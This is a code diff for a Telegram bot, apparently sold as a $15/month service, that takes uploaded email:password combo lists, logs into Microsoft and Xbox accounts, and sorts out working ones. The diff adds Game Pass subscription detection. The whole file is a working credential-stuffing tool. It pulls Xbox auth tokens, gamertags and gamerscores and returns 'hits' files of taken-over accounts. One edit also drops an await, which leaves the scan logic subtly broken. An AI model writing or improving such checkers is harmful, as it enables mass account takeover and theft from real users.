@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 """
-r1livk Elite Advanced Xbox & Microsoft Core Engine ⚡ - Telegram Bot
+r1livk GamePass Elite Checker & Filter Bot ⚡
 """
 
 import os
@@ -57,12 +57,12 @@ def check_user_subscription(user_id):
         pass
     return False
 
-REQUEST_TIMEOUT = 10
-CONCURRENT_LIMIT = 4
+REQUEST_TIMEOUT = 12
+CONCURRENT_LIMIT = 3
 
 active_scans = {}
 user_usage = {}
-DAILY_LIMIT = 5000
+DAILY_LIMIT = 3000
 
 def update_user_stats(user_id, checked_count, hits_count, username=None):
     stats = load_json_data(STATS_FILE, {})
@@ -126,7 +126,7 @@ def extract_url_post(text):
             return url
     return None
 
-async def elite_check_account(combo):
+async def check_gamepass_account(combo):
     parts = combo.split(':')
     if len(parts) < 2:
         return "bad", "Invalid Format"
@@ -211,7 +211,7 @@ async def elite_check_account(combo):
             if not ms_token:
                 return "bad", "No Token"
 
-            # Elite Xbox Session Pipeline
+            # استخراج توكنات Xbox
             xb_payload = {
                 "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, 
                 "RelyingParty": "http://auth.xboxlive.com", 
@@ -238,36 +238,59 @@ async def elite_check_account(combo):
 
             xsts_token = xsts_res.json()['Token']
             
-            # Deep Profile Extraction Endpoint
+            # فحص البروفايل (Gamertag & Gamerscore)
             prof_res = await session.get(
-                "https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore,AccountTier,TenureLevel", 
+                "https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore", 
                 headers={"Authorization": f"XBL3.0 x={uhs};{xsts_token}", "x-xbl-contract-version": "2"}, 
                 timeout=5
             )
 
             gamertag = "N/A"
             gamerscore = 0
-            tier = "Silver"
-            
             if prof_res.status_code == 200:
                 settings = prof_res.json().get('profileUsers', [{}])[0].get('settings', [])
                 for s in settings:
                     if s['id'] == 'Gamertag': gamertag = s['value']
                     if s['id'] == 'Gamerscore': gamerscore = int(s['value']) if str(s['value']).isdigit() else 0
-                    if s['id'] == 'AccountTier': tier = s['value']
 
-            if gamerscore <= 0:
-                return "bad", "0G Filtered"
+            # فحص اشتراكات الجيم باس (Game Pass Subscriptions Entitlements Endpoint)
+            game_pass_status = "No Game Pass ❌"
+            try:
+                # استخدام آبي التحقق من استحقاق المنتجات والاشتراكات
+                entitle_res = await session.get(
+                    "https://purchase.mp.microsoft.com/v8.0/keys/licenses", 
+                    headers={"Authorization": f"XBL3.0 x={uhs};{xsts_token}"}, 
+                    timeout=5
+                )
+                # فحص بديل عبر استعراض الاشتراكات النشطة في المتجر أو تفويضات الألعاب
+                sub_check_url = "https://eds.xboxlive.com/users/me/subscriptions"
+                sub_res = await session.get(
+                    sub_check_url,
+                    headers={"Authorization": f"XBL3.0 x={uhs};{xsts_token}", "x-xbl-contract-version": "1"},
+                    timeout=5
+                )
+                txt_sub = sub_res.text.lower()
+                if "game pass ultimate" in txt_sub or "ultimate" in txt_sub:
+                    game_pass_status = "🔥 Xbox Game Pass Ultimate!"
+                elif "game pass pc" in txt_sub or "pc access" in txt_sub:
+                    game_pass_status = "💻 Xbox Game Pass PC!"
+                elif "game pass" in txt_sub:
+                    game_pass_status = "🎮 Xbox Game Pass Standard!"
+                elif gamerscore > 0:
+                    game_pass_status = f"⚡ Active Account ({gamerscore}G) - No Active GP"
+            except:
+                if gamerscore > 0:
+                    game_pass_status = f"⚡ Valid Account ({gamerscore}G)"
 
             hit_data = (
-                f"⚡ [ELITE XBOX HIT] ⚡\n"
+                f"🎮 [GAME PASS & HIT FILTER] 🎮\n"
                 f"Combo: {email}:{password}\n"
                 f"Gamertag: {gamertag}\n"
                 f"Gamerscore: {gamerscore}G 🏆\n"
-                f"Account Tier: {tier}\n"
+                f"Subscription: {game_pass_status}\n"
                 f"=================================================="
             )
-            return "hit", {"content": hit_data}
+            return "hit", {"content": hit_data, "has_gp": "Game Pass" in game_pass_status}
 
     except Exception as e:
         return "error", str(e)
@@ -296,7 +319,7 @@ def show_main_menu(message):
     msg_id = message.message.message_id if hasattr(message, 'message') and hasattr(message.message, 'message_id') else None
 
     markup = types.InlineKeyboardMarkup(row_width=1)
-    btn_start = types.InlineKeyboardButton("🚀 Start Elite Xbox Pipeline", callback_data="start_checker")
+    btn_start = types.InlineKeyboardButton("🎮 Start GamePass Filter Bot", callback_data="start_checker")
     btn_top = types.InlineKeyboardButton("🏆 Leaderboard", callback_data="show_leaderboard")
     btn_premium = types.InlineKeyboardButton("💎 Buy Premium ($15/Month)", callback_data="buy_premium")
     btn_account = types.InlineKeyboardButton("👤 My Account", callback_data="my_account")
@@ -307,11 +330,11 @@ def show_main_menu(message):
         status_text = "👑 Premium / Owner (Unlimited)"
     else:
         used = user_usage.get(chat_id, {}).get("count", 0) if user_usage.get(chat_id, {}).get("date") == today else 0
-        status_text = f"👤 Free ({used}/5000 lines today)"
+        status_text = f"👤 Free ({used}/3000 lines today)"
 
     text = (
-        "⚡ **r1livk Elite Xbox Core Engine - V5.0** ⚡\n\n"
-        "Engine upgraded with advanced pipeline endpoints.\n"
+        "⚡ **r1livk GamePass Filter & Checker - V6.0** ⚡\n\n"
+        "Specialized in filtering accounts and detecting Game Pass status!\n"
         f"Your Status: {status_text}\n\n"
         "Select an option:"
     )
@@ -345,8 +368,8 @@ def callback_query(call):
         btn_cancel = types.InlineKeyboardButton("❌ Cancel", callback_data="back_to_menu")
         markup.add(btn_cancel)
         text = (
-            "🎯 **Elite Pipeline Mode Active**\n\n"
-            "Send your combo file in `.txt` format (`email:password`)"
+            "🎯 **GamePass Filter Mode Active**\n\n"
+            "Send your Hotmail/Outlook combo file in `.txt` format (`email:password`)"
         )
         bot.edit_message_text(text, chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)
 
@@ -356,7 +379,7 @@ def callback_query(call):
             bot.answer_callback_query(call.id, "📊 No stats yet.", show_alert=True)
             return
         sorted_users = sorted(stats.items(), key=lambda x: (x[1]["hits"], x[1]["checked"]), reverse=True)[:10]
-        lb_text = "🏆 **Elite Leaderboard - r1livk** 🏆\n\n"
+        lb_text = "🏆 **GamePass Leaderboard - r1livk** 🏆\n\n"
         medals = ["🥇", "🥈", "🥉", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"]
         for idx, (uid, data) in enumerate(sorted_users):
             medal = medals[idx] if idx < len(medals) else f"#{idx+1}"
@@ -385,10 +408,10 @@ def callback_query(call):
     elif call.data == "my_account":
         today = str(date.today())
         if chat_id == OWNER_ID or str(chat_id) in load_premium_users():
-            bot.answer_callback_query(call.id, "Status: Premium / Owner\nMode: Elite Pipeline", show_alert=True)
+            bot.answer_callback_query(call.id, "Status: Premium / Owner\nMode: GamePass Filter", show_alert=True)
         else:
             used = user_usage.get(chat_id, {}).get("count", 0) if user_usage.get(chat_id, {}).get("date") == today else 0
-            bot.answer_callback_query(call.id, f"Status: Free ({used}/5000 lines)\nMode: Elite Pipeline", show_alert=True)
+            bot.answer_callback_query(call.id, f"Status: Free ({used}/3000 lines)\nMode: GamePass Filter", show_alert=True)
 
 @bot.message_handler(content_types=['document'])
 def handle_docs(message):
@@ -401,7 +424,7 @@ def handle_docs(message):
         file_info = bot.get_file(message.document.file_id)
         downloaded_file = bot.download_file(file_info.file_path)
 
-        local_path = f"temp_elite_{chat_id}.txt"
+        local_path = f"temp_gp_{chat_id}.txt"
         with open(local_path, 'wb') as f:
             f.write(downloaded_file)
 
@@ -415,7 +438,7 @@ def handle_docs(message):
             return
 
         lines = lines[:count_allowed]
-        bot.reply_to(message, f"📥 File accepted. Initializing Elite Pipeline for {len(lines)} lines...")
+        bot.reply_to(message, f"📥 File accepted. Initializing GamePass Filter & Check for {len(lines)} lines...")
         active_scans[chat_id] = True
         username = message.from_user.username or message.from_user.first_name
         
@@ -426,18 +449,19 @@ def handle_docs(message):
         bot.reply_to(message, f"Error: {e}")
 
 def run_async_thread(chat_id, filepath, lines, username):
-    asyncio.run(process_elite_scan(chat_id, filepath, lines, username))
+    asyncio.run(process_gp_scan(chat_id, filepath, lines, username))
 
-async def process_elite_scan(chat_id, filepath, lines, username):
+async def process_gp_scan(chat_id, filepath, lines, username):
     total = len(lines)
     checked = 0
     hits = 0
+    gp_hits = 0
     tfa_count = 0
     bad = 0
     errors = 0
 
     timestamp_str = time.strftime("%Y%m%d_%H%M%S")
-    output_filename = f"r1livk_EliteHits_{timestamp_str}.txt"
+    output_filename = f"r1livk_GamePassHits_{timestamp_str}.txt"
     start_time = time.time()
 
     markup = types.InlineKeyboardMarkup(row_width=1)
@@ -446,12 +470,13 @@ async def process_elite_scan(chat_id, filepath, lines, username):
     markup.add(btn_stop, btn_back)
 
     initial_text = (
-        f"🔥 **ELITE PIPELINE SCAN STATS**\n\n"
+        f"🔥 **GAMEPASS FILTER SCAN STATS**\n\n"
         f"📊 Total: {total}\n"
         f"✅ Checked: 0\n"
         f"🔒 2FA: 0\n"
-        f"❌ Bad / 0G: 0\n"
-        f"🎯 Elite Hits: 0\n\n"
+        f"❌ Bad: 0\n"
+        f"🎯 Total Hits: 0\n"
+        f"🎮 GamePass Found: 0\n\n"
         f"Progress: 0.0%\n"
         f"⚡ CPM: 0\n"
         f"⏱️ Elapsed: 00:00:00"
@@ -461,15 +486,17 @@ async def process_elite_scan(chat_id, filepath, lines, username):
     sem = asyncio.Semaphore(CONCURRENT_LIMIT)
 
     async def worker(combo):
-        nonlocal checked, hits, tfa_count, bad, errors
+        nonlocal checked, hits, gp_hits, tfa_count, bad, errors
         if not active_scans.get(chat_id, True):
             return
 
         async with sem:
-            status, res_data = await elite_check_account(combo)
+            status, res_data = await check_gamepass_account(combo)
             checked += 1
             if status == "hit" and isinstance(res_data, dict):
                 hits += 1
+                if res_data.get("has_gp"):
+                    gp_hits += 1
                 with open(output_filename, 'a', encoding='utf-8') as out_f:
                     out_f.write(res_data["content"] + "\n\n")
             elif status == "2fa":
@@ -492,12 +519,13 @@ async def process_elite_scan(chat_id, filepath, lines, username):
                 pct = (checked / total) * 100
 
                 live_text = (
-                    f"🔥 **ELITE PIPELINE SCAN (Live)**\n\n"
+                    f"🔥 **GAMEPASS FILTER SCAN (Live)**\n\n"
                     f"📊 Total: {total}\n"
                     f"✅ Checked: {checked} ({pct:.1f}%)\n"
                     f"🔒 2FA: {tfa_count}\n"
-                    f"❌ Bad / 0G: {bad}\n"
-                    f"🎯 Elite Hits: {hits}\n\n"
+                    f"❌ Bad: {bad}\n"
+                    f"🎯 Total Hits: {hits}\n"
+                    f"🎮 GamePass Found: {gp_hits}\n\n"
                     f"⚡ CPM: {cpm}\n"
                     f"⏱️ Elapsed: {hrs:02d}:{mins:02d}:{secs:02d}"
                 )
@@ -507,7 +535,7 @@ async def process_elite_scan(chat_id, filepath, lines, username):
                     pass
 
     prog_task = asyncio.create_task(updater())
-    await asyncio.gather(*tasks, return_exceptions=True)
+    asyncio.gather(*tasks, return_exceptions=True)
     active_scans[chat_id] = False
     prog_task.cancel()
 
@@ -518,11 +546,12 @@ async def process_elite_scan(chat_id, filepath, lines, username):
     update_usage(chat_id, checked)
 
     final_msg = (
-        f"🎉 **ELITE SCAN COMPLETED!**\n\n"
+        f"🎉 **SCAN & FILTER COMPLETED!**\n\n"
         f"📊 Total Checked: {checked}\n"
-        f"🎯 Elite Hits Found: {hits}\n"
+        f"🎯 Total Hits: {hits}\n"
+        f"🎮 GamePass Hits: {gp_hits}\n"
         f"🔒 2FA Protected: {tfa_count}\n"
-        f"❌ Bad / 0G: {bad}"
+        f"❌ Bad Accounts: {bad}"
     )
     try:
         bot.edit_message_text(final_msg, chat_id=chat_id, message_id=status_msg.message_id, parse_mode="Markdown")
@@ -531,8 +560,8 @@ async def process_elite_scan(chat_id, filepath, lines, username):
 
     if hits > 0 and os.path.exists(output_filename):
         with open(output_filename, 'rb') as f:
-            bot.send_document(chat_id, f, caption=f"📁 **Elite Hits File:** {output_filename}")
+            bot.send_document(chat_id, f, caption=f"📁 **Filtered GamePass Hits File:** {output_filename}")
 
 if __name__ == "__main__":
-    print("🚀 r1livk Elite Xbox Core Engine is running...")
+    print("🚀 r1livk GamePass Filter Bot is running...")
     bot.infinity_polling()
